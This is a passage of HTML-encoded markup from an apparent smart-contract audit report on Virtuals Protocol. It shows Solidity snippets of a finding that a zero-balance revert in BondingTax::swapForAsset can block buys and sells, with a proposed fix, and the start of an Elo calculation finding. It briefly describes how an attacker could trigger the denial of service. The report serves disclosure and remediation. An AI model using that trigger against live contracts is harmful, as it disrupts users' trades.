{\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBondingTax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etaxManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswapForAsset\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();         \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Swap for Asset call\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"90\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// FRouter.sol\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esell\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enonReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyRole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eEXECUTOR_ROLE\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esellTax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etxFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etxFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efeeTo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etaxVault\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferAsset\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferAsset\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efeeTo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etxFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);                   \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Fee sent to taxManager\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efeeTo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etaxManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBondingTax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etaxManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswapForAsset\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();         \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Swap for Asset call\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHowever, when we have a closer look at the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/tax/BondingTax.sol#L122\"\u003e\u003ccode\u003eBondingTax::swapForAsset\u003c/code\u003e\u003c/a\u003e function, we can observe that it reverts if the balance of the contract is 0:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"91\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// BondingTax.sol\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswapForAsset\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyBondingRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etaxToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Nothing to be swapped\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);       \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Reverts if balance is 0\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminSwapThreshold\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk4\"\u003efalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emaxSwapThreshold\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emaxSwapThreshold\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHence, if buy and/or sell tax is set to 0 via \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/fun/FFactory.sol#L74\"\u003e\u003ccode\u003eFFactory::setTaxParams\u003c/code\u003e\u003c/a\u003e, there can be a case where the balance of \u003ccode\u003etaxManager\u003c/code\u003e becomes 0. \u003c/p\u003e\n\u003cp\u003eAlso this is not unlikely, and can be very easily manipulated by an attacker by simply donating exactly to match \u003ccode\u003emaxSwapThreshold\u003c/code\u003e funds. Setting fees to 0 is a very valid and intuitive value to set.\u003c/p\u003e\n\u003ch3 id=\"impact-13\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-13\" aria-label=\"impact 13 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eFailed buy and sell swaps will lead to DoS.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-19\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-19\" aria-label=\"recommended mitigation steps 19 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eIt is recommended to simply return with \u003ccode\u003e(false, 0)\u003c/code\u003e instead of reverting:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"92\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    // BondingTax.sol\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    function swapForAsset() public onlyBondingRouter returns (bool, uint256) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256 amount = IERC20(taxToken).balanceOf(address(this));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e-        require(amount \u0026gt; 0, \u0026quot;Nothing to be swapped\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e-        if (amount \u0026lt; minSwapThreshold) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+        if (amount \u0026lt; minSwapThreshold || amount == 0) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            return (false, 0);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        if (amount \u0026gt; maxSwapThreshold) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            amount = maxSwapThreshold;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-16-elo-calculation-error\" style=\"position:relative;\"\u003e\u003ca href=\"#m-16-elo-calculation-error\" aria-label=\"m 16 elo calculation error permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-71\"\u003e[M-16] \u003ccode\u003eElo\u003c/code\u003e calculation error\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-447\"\u003elevi_104\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-809\"\u003eaxelot\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-13\"\u003egmh5225\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-382\"\u003eio10\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/EloCalculator.sol#L39-L55\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/EloCalculator.sol#L39-L55\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-3\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-3\" aria-label=\"finding description and impact 3 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 